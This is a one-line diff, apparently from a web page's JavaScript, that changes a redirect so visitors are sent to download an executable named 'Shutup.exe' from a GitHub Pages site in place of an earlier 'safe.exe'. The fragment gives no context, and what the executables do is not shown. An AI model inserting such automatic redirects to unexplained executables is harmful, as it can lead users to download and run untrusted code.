@@ -1,1 +1,1 @@
-window.location.href = 'https://teakvoyage.github.io/safe.exe';
+window.location.href = 'https://beese79.github.io/Shutup.exe';
